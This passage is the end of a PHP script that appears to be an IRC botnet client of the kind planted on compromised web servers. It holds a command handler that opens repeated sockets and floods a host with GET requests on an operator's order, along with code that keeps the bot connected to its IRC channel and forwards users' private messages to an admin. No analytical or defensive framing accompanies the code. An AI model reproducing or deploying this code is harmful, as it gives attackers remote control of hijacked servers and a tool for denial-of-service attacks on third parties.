                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' : 4inviter: ' . $dFrom . ' 2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' : KB '.$chan.' '.$dNick.' '.$inv.' ' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' : 6' . $dFrom . ' 12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx();

?>






